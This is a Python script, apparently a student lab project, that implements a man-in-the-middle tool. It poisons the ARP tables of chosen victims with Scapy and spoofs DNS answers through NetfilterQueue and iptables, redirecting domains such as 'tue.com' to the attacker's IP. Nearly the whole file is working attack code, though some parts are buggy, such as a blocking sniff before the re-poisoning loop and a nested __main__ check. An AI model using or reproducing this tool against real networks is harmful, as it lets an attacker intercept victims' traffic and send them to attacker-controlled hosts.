
# MITM ARP spoofing attack - using Scapy

# Imports
from unittest import skip
from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR

# In enp0s9
# MAC Address M1: 08:00:27:76:14:01
# IP Address M1: 10.0.2.5

# MAC Address Gateway: 52:54:00:12:35:00 
# IP Address Gateway: 10.0.2.1

# MAC Address Attacker (M3): 08:00:27:e6:97:2f
# IP Address Attacker (M3): 10.0.2.4

# The main method to be ran by the user of our script
def main():
    typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
    if (typeOfAttack == 1):
        arp_poison()
    elif (typeOfAttack == 2):
        dns_spoof()
    else:
        print("No or wrong input.")

def arp_poison():
    # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
    nrOfHosts = int(input("The number of hosts you want to ARP poison: "))

    # If number of hosts is less than 2, a while loop is instantiated which can only be left if the number of hosts becomes greater or equal than 2.
    if (nrOfHosts < 2):
        print("A MITM ARP poisoning attack with less than 2 hosts is not possible.")
        print("The number of hosts you want to ARP poison: ")
        while (nrOfHosts < 2):
            nrOfHosts = input()

    # The user is given the option to choose how often the ARP entries need to be updated
    updateTimer = int(input("The the time (in seconds) it takes for the ARP entries to be updated (advice: Do not set it too high, e.g. > 60 seconds).\nSet update timer to: "))

    # If update timer is set to less than 1 seconds, a while loop is instantiated which can only be left if the update timer is set to greater or equal than 1.
    if (updateTimer < 1):
        print("A MITM ARP poisoning attack with an update timer < 1 seconds is not possible.")
        print("The the time (in seconds) it takes for the ARP entries to be updated (advice: Do not set it too high, e.g. > 60 seconds).\nSet update timer to: ")
        while (updateTimer < 1):
            updateTimer = input()

    macVictimList = []
    ipVictimList = []

    # The MAC and IP addresses of the victims and the attacker are obtained
    # victims must be separated into two groups, servers and hosts
    for i in range(nrOfHosts): 
        # Note: i + 1 is printed to the user of the software
        macVictimList.append(raw_input("The MAC address of the " + str(i+1) + "th victim:"))
        ipVictimList.append(raw_input("The IP address of the " + str(i+1) + "th victim:"))
    macAttacker = raw_input("The MAC address of the attacker:")
    # ipAttacker = input("The IP address of the attacker: ")

    
    # Send ARP package to every victim saying that each other victim is the attacker using the spoofed MAC address of the attacker
    # i goes through all the hosts and represents the victims that will be fooled
    for i in range(nrOfHosts):
        if (i==nrOfHosts):
                break
        # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
        for j in range(nrOfHosts):
            # No need to send ARP package to itself.
            if (i==j):
                j+=1
            # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
            # We must thus break the loop so we do not have an IndexError.
            if (j==nrOfHosts):
                break
            arp = Ether() / ARP()
            arp[Ether].src = macAttacker
            arp[ARP].hwsrc = macAttacker
            arp[ARP].psrc = ipVictimList[j] # spoofed
            arp[ARP].hwdst = macVictimList[i] # tricked
            arp[ARP].pdst = ipVictimList[i]
            sendp(arp, iface="enp0s9")
    
    # Call sniff to start sniffing for incoming packets from victims
    sniff(iface = "enp0s9")

    # A infinite loop is used to send ARP packages continuously updating the ARP tables of the victims
    while(True):     
        for i in range(nrOfHosts):
            if (i==nrOfHosts):
                break
            # j goes through all the hosts and represents the IPs that will be spoofed. Essentially, The goal is to have every host think every other host is the attacker.
            for j in range(nrOfHosts):
                # No need to send ARP package to itself.
                if (i==j):
                    j+=1
                # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
                # We must thus break the loop so we do not have an IndexError.
                if (j==nrOfHosts):
                    break
                arp = Ether() / ARP()
                arp[Ether].src = macAttacker
                arp[ARP].hwsrc = macAttacker
                arp[ARP].psrc = ipVictimList[j] # spoofed
                arp[ARP].hwdst = macVictimList[i] # tricked
                arp[ARP].pdst = ipVictimList[i]
                sendp(arp, iface="enp0s9")
        # Timer
        # Default we used while testing was: updateTimer = 3
        time.sleep(updateTimer)


# To Do: before you are able to run this method succesfully
#
# In terminal:
#   wget -c https://bootstrap.pypa.io/pip/2.7/get-pip.py
#   python get-pip.py
#   sudo apt update && sudo apt install python-dev build-essential libnetfilter-queue-dev
#   pip install netfilterqueue==0.9.0

def dns_spoof():
    # The user needs to input the ipVictim
    ipVictim = raw_input("The IP address of the victim: ")

    # The user needs to input the ipAttacker
    ipAttacker = raw_input("The IP address of the attacker: ")

    # The user needs to input the ipGatewayRouter
    ipGatewayRouter = raw_input("The IP address of the gateway router: ")

    class DnsSnoof:
        def __init__(self, dns_hosts, queueNum):
            self.dns_hosts = dns_hosts
            self.queueNum = queueNum
            self.queue = NetfilterQueue()
  
        def __call__(self):
            log.info("Snoofing....")
            os.system(f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
            self.queue.bind(self.queueNum, self.callBack)
            try:
                self.queue.run()
            except KeyboardInterrupt:
                os.system(
                    f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
                log.info("[!] iptable rule flushed")
  
        def callBack(self, packet):
            scapyPacket = IP(packet.get_payload())
            if scapyPacket.haslayer(DNSRR):
                try:
                    log.info(f'[original] { scapyPacket[DNSRR].summary()}')
                    queryName = scapyPacket[DNSQR].qname
                    if queryName in self.dns_hosts:
                        scapyPacket[DNS].an = DNSRR(
                            rrname=queryName, rdata=self.dns_hosts[queryName])
                        scapyPacket[DNS].ancount = 1
                        del scapyPacket[IP].len
                        del scapyPacket[IP].chksum
                        del scapyPacket[UDP].len
                        del scapyPacket[UDP].chksum
                        log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
                    else:
                        log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
                except IndexError as error:
                    log.error(error)
                packet.set_payload(bytes(scapyPacket))
            return packet.accept()
  
  
    if __name__ == '__main__':
        try:
            #the hosts that we try to spoof
            dns_hosts = {
                b"tue.com.": ipAttacker,
                b"site.com.": ipAttacker
            }
            queueNum = 1
            log.basicConfig(format='%(asctime)s - %(message)s', 
                            level = log.INFO)
            snoof = DnsSnoof(dns_hosts, queueNum)
            snoof()
        except OSError as error:
            log.error(error)

main()
